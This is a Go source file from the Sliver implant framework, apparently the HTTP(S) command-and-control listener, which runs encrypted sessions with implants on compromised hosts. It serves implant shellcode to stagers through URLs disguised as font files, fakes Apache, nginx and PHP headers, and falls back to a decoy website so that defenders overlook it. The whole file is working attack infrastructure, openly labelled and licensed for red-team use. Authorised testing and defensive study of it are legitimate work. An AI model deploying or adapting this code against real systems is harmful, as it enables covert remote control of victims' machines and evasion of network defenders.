package c2

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	insecureRand "math/rand"
	"net"
	"net/http"
	"net/url"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
	"unicode"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/certs"
	"github.com/bishopfox/sliver/server/configs"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/cryptography"
	sliverHandlers "github.com/bishopfox/sliver/server/handlers"
	"github.com/bishopfox/sliver/server/log"
	"github.com/bishopfox/sliver/server/website"
	"github.com/bishopfox/sliver/util/encoders"

	"github.com/gorilla/mux"
	"google.golang.org/protobuf/proto"
)

var (
	httpLog   = log.NamedLogger("c2", "http")
	accessLog = log.NamedLogger("c2", "http-access")

	ErrMissingNonce   = errors.New("nonce not found in request")
	ErrMissingOTP     = errors.New("otp code not found in request")
	ErrInvalidEncoder = errors.New("invalid request encoder")
	ErrDecodeFailed   = errors.New("failed to decode request")
	ErrReplayAttack   = errors.New("replay attack detected")
)

const (
	DefaultMaxBodyLength = 4 * 1024 * 1024 * 1024 // 4Gb
	DefaultHTTPTimeout   = time.Second * 60
)

func init() {
	insecureRand.Seed(time.Now().UnixNano())
}

// HTTPSession - Holds data related to a sliver c2 session
type HTTPSession struct {
	ID      string
	Session *core.Session
	Key     cryptography.AESKey
	Started time.Time
	replay  map[string]bool // Sessions are mutex'd
}

// Keeps a hash of each msg in a session to detect replay'd messages
func (s *HTTPSession) isReplayAttack(ciphertext []byte) bool {
	if len(ciphertext) < 1 {
		return false
	}
	sha := sha256.New()
	sha.Write(ciphertext)
	digest := base64.RawStdEncoding.EncodeToString(sha.Sum(nil))
	if _, ok := s.replay[digest]; ok {
		return true
	}
	s.replay[digest] = true
	return false
}

// HTTPSessions - All currently open HTTP sessions
type HTTPSessions struct {
	active *map[string]*HTTPSession
	mutex  *sync.RWMutex
}

// Add - Add an HTTP session
func (s *HTTPSessions) Add(session *HTTPSession) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	(*s.active)[session.ID] = session
}

// Get - Get an HTTP session
func (s *HTTPSessions) Get(sessionID string) *HTTPSession {
	s.mutex.RLock()
	defer s.mutex.RUnlock()
	return (*s.active)[sessionID]
}

// Remove - Remove an HTTP session
func (s *HTTPSessions) Remove(sessionID string) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	delete((*s.active), sessionID)
}

// HTTPHandler - Path mapped to a handler function
type HTTPHandler func(resp http.ResponseWriter, req *http.Request)

// HTTPServerConfig - Config data for servers
type HTTPServerConfig struct {
	Addr    string
	LPort   uint16
	Domain  string
	Website string
	Secure  bool
	Cert    []byte
	Key     []byte
	ACME    bool

	MaxRequestLength int

	EnforceOTP           bool
	LongPollTimeoutMilli int
	LongPollJitterMilli  int
}

// SliverHTTPC2 - Holds refs to all the C2 objects
type SliverHTTPC2 struct {
	HTTPServer   *http.Server
	Conf         *HTTPServerConfig
	HTTPSessions *HTTPSessions
	SliverStage  []byte // Sliver shellcode to serve during staging process
	Cleanup      func()

	server    string
	poweredBy string
}

func (s *SliverHTTPC2) getServerHeader() string {
	if s.server == "" {
		switch insecureRand.Intn(1) {
		case 0:
			s.server = fmt.Sprintf("Apache/2.4.%d (Unix)", insecureRand.Intn(48))
		default:
			s.server = fmt.Sprintf("nginx/1.%d.%d (Ubuntu)", insecureRand.Intn(21), insecureRand.Intn(8))
		}
	}
	return s.server
}

func (s *SliverHTTPC2) getCookieName() string {
	cookies := configs.GetHTTPC2Config().ServerConfig.Cookies
	index := insecureRand.Intn(len(cookies))
	return cookies[index]
}

func (s *SliverHTTPC2) getPoweredByHeader() string {
	if s.poweredBy == "" {
		switch insecureRand.Intn(1) {
		case 0:
			s.poweredBy = fmt.Sprintf("PHP/8.0.%d", insecureRand.Intn(10))
		default:
			s.poweredBy = fmt.Sprintf("PHP/7.%d.%d", insecureRand.Intn(4), insecureRand.Intn(20))
		}
	}
	return s.poweredBy
}

// StartHTTPSListener - Start an HTTP(S) listener, this can be used to start both
//						HTTP/HTTPS depending on the caller's conf
// TODO: Better error handling, configurable ACME host/port
func StartHTTPSListener(conf *HTTPServerConfig) (*SliverHTTPC2, error) {
	StartPivotListener()
	httpLog.Infof("Starting https listener on '%s'", conf.Addr)
	server := &SliverHTTPC2{
		Conf: conf,
		HTTPSessions: &HTTPSessions{
			active: &map[string]*HTTPSession{},
			mutex:  &sync.RWMutex{},
		},
	}
	server.HTTPServer = &http.Server{
		Addr:         conf.Addr,
		Handler:      server.router(),
		WriteTimeout: DefaultHTTPTimeout,
		ReadTimeout:  DefaultHTTPTimeout,
		IdleTimeout:  DefaultHTTPTimeout,
		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler), 0),
	}
	if conf.ACME {
		conf.Domain = filepath.Base(conf.Domain) // I don't think we need this, but we do it anyways
		httpLog.Infof("Attempting to fetch let's encrypt certificate for '%s' ...", conf.Domain)
		acmeManager := certs.GetACMEManager(conf.Domain)
		acmeHTTPServer := &http.Server{Addr: ":80", Handler: acmeManager.HTTPHandler(nil)}
		go acmeHTTPServer.ListenAndServe()
		server.HTTPServer.TLSConfig = &tls.Config{
			GetCertificate: acmeManager.GetCertificate,
		}
		server.Cleanup = func() {
			ctx, cancelHTTP := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancelHTTP()
			if err := acmeHTTPServer.Shutdown(ctx); err != nil {
				httpLog.Warnf("Failed to shutdown http acme server")
			}
			ctx, cancelHTTPS := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancelHTTPS()
			server.HTTPServer.Shutdown(ctx)
			if err := acmeHTTPServer.Shutdown(ctx); err != nil {
				httpLog.Warn("Failed to shutdown https server")
			}
		}
	} else {
		server.HTTPServer.TLSConfig = getHTTPTLSConfig(conf)
		server.Cleanup = func() {
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()
			server.HTTPServer.Shutdown(ctx)
			if err := server.HTTPServer.Shutdown(ctx); err != nil {
				httpLog.Warn("Failed to shutdown https server")
			}
		}
	}
	_, _, err := certs.C2ServerGetRSACertificate(conf.Domain)
	if err == certs.ErrCertDoesNotExist {
		httpLog.Infof("Generating C2 server certificate ...")
		_, _, err := certs.C2ServerGenerateRSACertificate(conf.Domain)
		if err != nil {
			httpLog.Errorf("Failed to generate server rsa certificate %s", err)
			return nil, err
		}
	}
	return server, nil
}

func getHTTPTLSConfig(conf *HTTPServerConfig) *tls.Config {
	if conf.Cert == nil || conf.Key == nil {
		var err error
		if conf.Domain != "" {
			conf.Cert, conf.Key, err = certs.HTTPSGenerateRSACertificate(conf.Domain)
		} else {
			conf.Cert, conf.Key, err = certs.HTTPSGenerateRSACertificate("localhost")
		}
		if err != nil {
			httpLog.Errorf("Failed to generate self-signed tls cert/key pair %s", err)
			return nil
		}
	}
	cert, err := tls.X509KeyPair(conf.Cert, conf.Key)
	if err != nil {
		httpLog.Errorf("Failed to parse tls cert/key pair %s", err)
		return nil
	}
	return &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
	}
}

func (s *SliverHTTPC2) router() *mux.Router {
	router := mux.NewRouter()

	// Procedural C2
	// ===============
	// .txt = rsakey
	// 1.phtml / .php = start / session
	// .js = poll
	// .png = stop
	// .woff = sliver shellcode

	router.HandleFunc("/{rpath:.*\\.txt$}", s.rsaKeyHandler).MatcherFunc(filterNonce).Methods(http.MethodGet)
	router.HandleFunc("/{rpath:.*\\.phtml$}", s.startSessionHandler).MatcherFunc(filterNonce).Methods(http.MethodGet, http.MethodPost)
	router.HandleFunc("/{rpath:.*\\.php$}", s.sessionHandler).MatcherFunc(filterNonce).Methods(http.MethodGet, http.MethodPost)
	router.HandleFunc("/{rpath:.*\\.js$}", s.pollHandler).MatcherFunc(filterNonce).Methods(http.MethodGet)
	router.HandleFunc("/{rpath:.*\\.png$}", s.stopHandler).MatcherFunc(filterNonce).Methods(http.MethodGet)

	// Can't force the user agent on the stager payload
	// Request from msf stager payload will look like:
	// GET /fonts/Inter-Medium.woff/B64_ENCODED_PAYLOAD_UUID
	router.HandleFunc("/{rpath:.*\\.woff[/]{0,1}.*$}", s.stagerHander).Methods(http.MethodGet)

	// Request does not match the C2 profile so we pass it to the static content or 404 handler
	if s.Conf.Website != "" {
		httpLog.Infof("Serving static content from website %v", s.Conf.Website)
		router.HandleFunc("/{rpath:.*}", s.websiteContentHandler).Methods(http.MethodGet)
	} else {
		// 404 Handler - Just 404 on every path that doesn't match another handler
		httpLog.Infof("No website content, using wildcard 404 handler")
		router.HandleFunc("/{rpath:.*}", default404Handler).Methods(http.MethodGet, http.MethodPost)
	}

	router.Use(loggingMiddleware)
	router.Use(s.DefaultRespHeaders)

	return router
}

// This filters requests that do not have a valid nonce
func filterNonce(req *http.Request, rm *mux.RouteMatch) bool {
	nonce, err := getNonceFromURL(req.URL)
	if err != nil {
		httpLog.Warnf("Invalid nonce '%d' ignore request", nonce)
		return false // NaN
	}
	return true
}

func getNonceFromURL(reqURL *url.URL) (int, error) {
	qNonce := ""
	for arg, values := range reqURL.Query() {
		if len(arg) == 1 {
			qNonce = digitsOnly(values[0])
			break
		}
	}
	if qNonce == "" {
		httpLog.Warn("Nonce not found in request")
		return 0, ErrMissingNonce
	}
	nonce, err := strconv.Atoi(qNonce)
	if err != nil {
		httpLog.Warnf("Invalid nonce, failed to parse '%s'", qNonce)
		return 0, err
	}
	httpLog.Debugf("Request nonce = %d", nonce)
	_, _, err = encoders.EncoderFromNonce(nonce)
	if err != nil {
		httpLog.Warnf("Invalid nonce (%s)", err)
		return 0, err
	}
	return nonce, nil
}

func getOTPFromURL(reqURL *url.URL) (string, error) {
	otpCode := ""
	for arg, values := range reqURL.Query() {
		if len(arg) == 2 {
			otpCode = digitsOnly(values[0])
			break
		}
	}
	if otpCode == "" {
		httpLog.Warn("OTP not found in request")
		return "", ErrMissingNonce
	}
	httpLog.Debugf("Request OTP = %s", otpCode)
	return otpCode, nil
}

func digitsOnly(value string) string {
	var buf bytes.Buffer
	for _, char := range value {
		if unicode.IsDigit(char) {
			buf.WriteRune(char)
		}
	}
	return buf.String()
}

func loggingMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(resp http.ResponseWriter, req *http.Request) {
		accessLog.Infof("%s - %s - %v", getRemoteAddr(req), req.RequestURI, req.Header.Get("User-Agent"))
		next.ServeHTTP(resp, req)
	})
}

// DefaultRespHeaders - Configures default response headers
func (s *SliverHTTPC2) DefaultRespHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(resp http.ResponseWriter, req *http.Request) {
		resp.Header().Set("Server", s.getServerHeader())
		resp.Header().Set("X-Powered-By", s.getPoweredByHeader())
		resp.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate")

		switch uri := req.URL.Path; {
		case strings.HasSuffix(uri, ".txt"):
			resp.Header().Set("Content-type", "text/plain; charset=utf-8")
		case strings.HasSuffix(uri, ".css"):
			resp.Header().Set("Content-type", "text/css; charset=utf-8")
		case strings.HasSuffix(uri, ".php"):
			resp.Header().Set("Content-type", "text/html; charset=utf-8")
		case strings.HasSuffix(uri, ".js"):
			resp.Header().Set("Content-type", "text/javascript; charset=utf-8")
		case strings.HasSuffix(uri, ".png"):
			resp.Header().Set("Content-type", "image/png")
		default:
			resp.Header().Set("Content-type", "application/octet-stream")
		}

		next.ServeHTTP(resp, req)
	})
}

func (s *SliverHTTPC2) websiteContentHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Infof("Request for site %v -> %s", s.Conf.Website, req.RequestURI)
	contentType, content, err := website.GetContent(s.Conf.Website, req.RequestURI)
	if err != nil {
		httpLog.Infof("No website content for %s", req.RequestURI)
		resp.WriteHeader(http.StatusNotFound) // No content for this path
		return
	}
	resp.Header().Set("Content-type", contentType)
	resp.Write(content)
}

func default404Handler(resp http.ResponseWriter, req *http.Request) {
	resp.WriteHeader(http.StatusNotFound)
}

// [ HTTP Handlers ] ---------------------------------------------------------------

func (s *SliverHTTPC2) rsaKeyHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Info("Public key request")
	if s.Conf.EnforceOTP {
		otpCode, err := getOTPFromURL(req.URL)
		if err != nil {
			resp.WriteHeader(http.StatusNotFound)
			return
		}
		valid, err := cryptography.ValidateTOTP(otpCode)
		if err != nil {
			httpLog.Warnf("Failed to validate OTP %s", err)
		}
		if !valid {
			resp.WriteHeader(http.StatusNotFound)
			return
		}
	}
	nonce, _ := getNonceFromURL(req.URL)
	certPEM, _, err := certs.GetCertificate(certs.C2ServerCA, certs.RSAKey, s.Conf.Domain)
	if err != nil {
		httpLog.Infof("Failed to get server certificate for cn = '%s': %s", s.Conf.Domain, err)
	}
	_, encoder, err := encoders.EncoderFromNonce(nonce)
	if err != nil {
		httpLog.Infof("Failed to find encoder from nonce %d", nonce)
	}
	resp.Write(encoder.Encode(certPEM))
}

func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Info("Start http session request")
	if s.Conf.EnforceOTP {
		otpCode, err := getOTPFromURL(req.URL)
		if err != nil {
			resp.WriteHeader(http.StatusNotFound)
			return
		}
		valid, err := cryptography.ValidateTOTP(otpCode)
		if err != nil {
			httpLog.Warnf("Failed to validate OTP %s", err)
		}
		if !valid {
			resp.WriteHeader(http.StatusNotFound)
			return
		}
	}

	// Note: these are the c2 certificates NOT the certificates/keys used for SSL/TLS
	publicKeyPEM, privateKeyPEM, err := certs.GetCertificate(certs.C2ServerCA, certs.RSAKey, s.Conf.Domain)
	if err != nil {
		httpLog.Warn("Failed to fetch rsa private key")
		resp.WriteHeader(http.StatusNotFound)
		return
	}

	// RSA decrypt request body
	publicKeyBlock, _ := pem.Decode([]byte(publicKeyPEM))
	httpLog.Debugf("RSA Fingerprint: %s", fingerprintSHA256(publicKeyBlock))
	privateKeyBlock, _ := pem.Decode([]byte(privateKeyPEM))
	privateKey, _ := x509.ParsePKCS1PrivateKey(privateKeyBlock.Bytes)

	nonce, _ := getNonceFromURL(req.URL)
	_, encoder, err := encoders.EncoderFromNonce(nonce)
	if err != nil {
		httpLog.Warnf("Request specified an invalid encoder (%d)", nonce)
		resp.WriteHeader(http.StatusNotFound)
		return
	}
	body, err := ioutil.ReadAll(req.Body)
	if err != nil {
		httpLog.Errorf("Failed to read body %s", err)
		resp.WriteHeader(http.StatusNotFound)
	}
	data, err := encoder.Decode(body)
	if err != nil {
		httpLog.Errorf("Failed to decode body %s", err)
		resp.WriteHeader(http.StatusNotFound)
		return
	}

	sessionInitData, err := cryptography.RSADecrypt(data, privateKey)
	if err != nil {
		httpLog.Error("RSA decryption failed")
		resp.WriteHeader(http.StatusNotFound)
		return
	}
	sessionInit := &sliverpb.HTTPSessionInit{}
	proto.Unmarshal(sessionInitData, sessionInit)

	httpSession := newHTTPSession()
	httpSession.Key, _ = cryptography.AESKeyFromBytes(sessionInit.Key)
	httpSession.Session = core.Sessions.Add(&core.Session{
		ID:            core.NextSessionID(),
		Transport:     "http(s)",
		RemoteAddress: getRemoteAddr(req),
		Send:          make(chan *sliverpb.Envelope),
		RespMutex:     &sync.RWMutex{},
		Resp:          map[uint64]chan *sliverpb.Envelope{},
	})
	httpSession.Session.UpdateCheckin()
	s.HTTPSessions.Add(httpSession)
	httpLog.Infof("Started new session with http session id: %s", httpSession.ID)

	ciphertext, err := cryptography.GCMEncrypt(httpSession.Key, []byte(httpSession.ID))
	if err != nil {
		httpLog.Info("Failed to encrypt session identifier")
		resp.WriteHeader(http.StatusNotFound)
		return
	}
	http.SetCookie(resp, &http.Cookie{
		Domain:   s.Conf.Domain,
		Name:     s.getCookieName(),
		Value:    httpSession.ID,
		Secure:   false,
		HttpOnly: true,
	})
	resp.Write(encoder.Encode(ciphertext))
}

func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Info("Session request")
	httpSession := s.getHTTPSession(req)
	if httpSession == nil {
		httpLog.Infof("No session with id %#v", httpSession.ID)
		resp.WriteHeader(http.StatusForbidden)
		return
	}

	plaintext, err := s.readReqBody(httpSession, resp, req)
	if err != nil {
		return
	}
	envelope := &sliverpb.Envelope{}
	proto.Unmarshal(plaintext, envelope)

	handlers := sliverHandlers.GetSessionHandlers()
	if envelope.ID != 0 {
		httpSession.Session.RespMutex.RLock()
		defer httpSession.Session.RespMutex.RUnlock()
		if resp, ok := httpSession.Session.Resp[envelope.ID]; ok {
			resp <- envelope
		}
	} else if handler, ok := handlers[envelope.Type]; ok {
		handler.(func(*core.Session, []byte))(httpSession.Session, envelope.Data)
	}
	resp.WriteHeader(http.StatusAccepted)
}

func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) {
	httpSession := s.getHTTPSession(req)
	if httpSession == nil {
		httpLog.Infof("No session with id %#v", httpSession.ID)
		resp.WriteHeader(http.StatusForbidden)
		return
	}

	// We already know we have a valid nonce because of the middleware filter
	nonce, _ := getNonceFromURL(req.URL)
	_, encoder, _ := encoders.EncoderFromNonce(nonce)
	select {
	case envelope := <-httpSession.Session.Send:
		resp.WriteHeader(http.StatusOK)
		envelopeData, _ := proto.Marshal(envelope)
		ciphertext, err := cryptography.GCMEncrypt(httpSession.Key, envelopeData)
		if err != nil {
			httpLog.Errorf("Failed to encrypt message %s", err)
			ciphertext = []byte{}
		}
		resp.Write(encoder.Encode(ciphertext))
	case <-time.After(s.getPollTimeout()):
		httpLog.Debug("Poll time out")
		resp.Header().Set("Etag", s.randomEtag())
		resp.WriteHeader(http.StatusNoContent)
		resp.Write([]byte{})
	}
}

func (s *SliverHTTPC2) readReqBody(httpSession *HTTPSession, resp http.ResponseWriter, req *http.Request) ([]byte, error) {
	nonce, _ := getNonceFromURL(req.URL)
	_, encoder, err := encoders.EncoderFromNonce(nonce)
	if err != nil {
		httpLog.Warnf("Request specified an invalid encoder (%d)", nonce)
		resp.WriteHeader(http.StatusNotFound)
		return nil, ErrInvalidEncoder
	}
	limitedReader := &io.LimitedReader{R: req.Body, N: int64(s.Conf.MaxRequestLength)}
	body, err := ioutil.ReadAll(limitedReader)
	if err != nil {
		httpLog.Warnf("Failed to read request body %s", err)
		return nil, err
	}

	data, err := encoder.Decode(body)
	if err != nil {
		httpLog.Warnf("Failed to decode body %s", err)
		resp.WriteHeader(http.StatusNotFound)
		return nil, ErrDecodeFailed
	}

	if httpSession.isReplayAttack(data) {
		httpLog.Warn("Replay attack detected")
		resp.WriteHeader(http.StatusNotFound)
		return nil, ErrReplayAttack
	}
	plaintext, err := cryptography.GCMDecrypt(httpSession.Key, data)
	return plaintext, err
}

func (s *SliverHTTPC2) getPollTimeout() time.Duration {
	return time.Duration(s.Conf.LongPollTimeoutMilli+insecureRand.Intn(s.Conf.LongPollJitterMilli)) * time.Millisecond
}

func (s *SliverHTTPC2) randomEtag() string {
	buf := make([]byte, 16)
	rand.Read(buf)
	return hex.EncodeToString(buf[:])
}

func (s *SliverHTTPC2) stopHandler(resp http.ResponseWriter, req *http.Request) {
	httpSession := s.getHTTPSession(req)
	if httpSession == nil {
		httpLog.Infof("No session with id %#v", httpSession.ID)
		resp.WriteHeader(http.StatusForbidden)
		return
	}

	_, err := s.readReqBody(httpSession, resp, req)
	if err != nil {
		return
	}

	core.Sessions.Remove(httpSession.Session.ID)
	s.HTTPSessions.Remove(httpSession.ID)
	resp.WriteHeader(http.StatusAccepted)
}

// stagerHander - Serves the sliver shellcode to the stager requesting it
func (s *SliverHTTPC2) stagerHander(resp http.ResponseWriter, req *http.Request) {
	if len(s.SliverStage) != 0 {
		httpLog.Infof("Received staging request from %s", getRemoteAddr(req))
		resp.Write(s.SliverStage)
		httpLog.Infof("Serving sliver shellcode (size %d) to %s", len(s.SliverStage), getRemoteAddr(req))
		resp.WriteHeader(200)
	} else {
		resp.WriteHeader(http.StatusNotFound)
	}
}

func (s *SliverHTTPC2) getHTTPSession(req *http.Request) *HTTPSession {
	for _, cookie := range req.Cookies() {
		httpSession := s.HTTPSessions.Get(cookie.Value)
		if httpSession != nil {
			httpSession.Session.UpdateCheckin()
			return httpSession
		}
	}
	return nil // No valid cookie names
}

func newHTTPSession() *HTTPSession {
	return &HTTPSession{
		ID:      newHTTPSessionID(),
		Started: time.Now(),
		replay:  map[string]bool{},
	}
}

// newHTTPSessionID - Get a 128bit session ID
func newHTTPSessionID() string {
	buf := make([]byte, 16)
	rand.Read(buf)
	return hex.EncodeToString(buf)
}

func getRemoteAddr(req *http.Request) string {
	ipAddress := req.Header.Get("X-Real-Ip")
	if ipAddress == "" {
		ipAddress = req.Header.Get("X-Forwarded-For")
	}
	if ipAddress == "" {
		return req.RemoteAddr
	}

	// Try to parse the header as an IP address, as this is user controllable
	// input we don't want to trust it.
	ip := net.ParseIP(ipAddress)
	if ip == nil {
		httpLog.Warn("Failed to parse X-Header as ip address")
		return req.RemoteAddr
	}
	return fmt.Sprintf("tcp(%s)->%s", req.RemoteAddr, ip.String())
}